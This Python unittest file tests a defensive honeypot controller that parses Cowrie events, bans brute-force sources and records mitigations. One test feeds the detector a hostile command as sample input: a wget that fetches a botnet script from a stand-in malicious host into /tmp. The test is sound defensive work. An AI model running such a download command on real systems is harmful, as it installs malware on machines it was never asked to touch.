import os
import tempfile
import time
import unittest

from controller.core.db import DefenseDatabase
from controller.core.detector import IntrusionDetector
from controller.core.models import CowrieEvent, MitigationRecord
from controller.mitigation.allowlist import AllowlistManager
from controller.mitigation.firewall import FirewallController


class TestCowrieEventModel(unittest.TestCase):
    def test_from_cowrie_json(self) -> None:
        raw_json = {
            "eventid": "cowrie.login.failed",
            "src_ip": "198.51.100.77",
            "src_port": 54321,
            "dst_port": 2222,
            "username": "root",
            "password": "123456Password",
            "session": "abc123session",
            "message": "login attempt [root/123456Password] failed",
        }
        event = CowrieEvent.from_cowrie_json(raw_json)
        self.assertEqual(event.eventid, "cowrie.login.failed")
        self.assertEqual(event.src_ip, "198.51.100.77")
        self.assertEqual(event.username, "root")
        self.assertEqual(event.password, "123456Password")
        self.assertEqual(event.src_port, 54321)


class TestDefenseDatabase(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "test_defense.db")
        self.db = DefenseDatabase(db_path=self.db_path)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_record_and_get_mitigation(self) -> None:
        record = MitigationRecord(
            src_ip="203.0.113.5",
            action="IPTABLES_DROP",
            reason="Test brute-force",
            severity="HIGH",
            timestamp=time.time(),
        )
        rec_id = self.db.record_mitigation(record)
        self.assertGreater(rec_id, 0)

        history = self.db.get_history(limit=10)
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["src_ip"], "203.0.113.5")
        self.assertEqual(history[0]["action"], "IPTABLES_DROP")

        active_bans = self.db.get_active_bans()
        self.assertEqual(len(active_bans), 1)
        self.assertEqual(active_bans[0]["src_ip"], "203.0.113.5")

    def test_unban_removes_from_active_bans(self) -> None:
        # First ban
        self.db.record_mitigation(MitigationRecord(
            src_ip="203.0.113.10",
            action="IPTABLES_DROP",
            reason="Attack",
            severity="HIGH",
        ))
        self.assertEqual(len(self.db.get_active_bans()), 1)

        # Unban
        self.db.record_mitigation(MitigationRecord(
            src_ip="203.0.113.10",
            action="UNBAN",
            reason="Manual unban",
            severity="LOW",
        ))
        self.assertEqual(len(self.db.get_active_bans()), 0)


class TestIntrusionDetector(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "test_detector.db")
        self.db = DefenseDatabase(db_path=self.db_path)
        self.allowlist = AllowlistManager()
        self.firewall = FirewallController(allowlist_manager=self.allowlist, dry_run=True)
        self.detector = IntrusionDetector(
            firewall=self.firewall,
            db=self.db,
            allowlist=self.allowlist,
            failed_login_threshold=5,
            time_window_seconds=30.0,
        )

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_brute_force_threshold_detection(self) -> None:
        attacker_ip = "198.51.100.99"

        # 4 failed logins: no ban
        for i in range(4):
            evt = CowrieEvent(
                eventid="cowrie.login.failed",
                src_ip=attacker_ip,
                username="admin",
                password=f"pass{i}",
            )
            res = self.detector.process_event(evt)
            self.assertIsNone(res)
            self.assertFalse(self.firewall.is_ip_banned(attacker_ip))

        # 5th failed login: triggers ban
        fifth_evt = CowrieEvent(
            eventid="cowrie.login.failed",
            src_ip=attacker_ip,
            username="admin",
            password="passFinal",
        )
        res = self.detector.process_event(fifth_evt)
        self.assertIsNotNone(res)
        self.assertEqual(res.src_ip, attacker_ip)
        self.assertEqual(res.action, "IPTABLES_DROP")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))

        # Database audit record check
        history = self.db.get_history()
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["src_ip"], attacker_ip)

    def test_allowlist_never_banned(self) -> None:
        gateway_ip = "172.20.0.1"

        # 10 failed logins from gateway
        for i in range(10):
            evt = CowrieEvent(
                eventid="cowrie.login.failed",
                src_ip=gateway_ip,
                username="root",
            )
            res = self.detector.process_event(evt)
            self.assertIsNone(res)

        self.assertFalse(self.firewall.is_ip_banned(gateway_ip))

    def test_critical_command_execution(self) -> None:
        attacker_ip = "203.0.113.88"
        cmd_evt = CowrieEvent(
            eventid="cowrie.command.input",
            src_ip=attacker_ip,
            input_command="wget http://malicious.payload/botnet.sh -O /tmp/bot",
        )
        res = self.detector.process_event(cmd_evt)
        self.assertIsNotNone(res)
        self.assertEqual(res.severity, "CRITICAL")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))

    def test_manual_unban_and_reset(self) -> None:
        target_ip = "198.51.100.150"
        self.firewall.ban_ip(target_ip)
        self.assertTrue(self.firewall.is_ip_banned(target_ip))

        # Manual unban
        unban_res = self.detector.manual_unban(target_ip, admin_user="sec_admin")
        self.assertTrue(unban_res)
        self.assertFalse(self.firewall.is_ip_banned(target_ip))

        # Global reset
        self.firewall.ban_ip("198.51.100.151")
        self.firewall.ban_ip("198.51.100.152")
        self.assertEqual(len(self.firewall.list_banned_ips()), 2)
        reset_res = self.detector.reset_all_bans()
        self.assertTrue(reset_res)
        self.assertEqual(len(self.firewall.list_banned_ips()), 0)


if __name__ == "__main__":
    unittest.main()

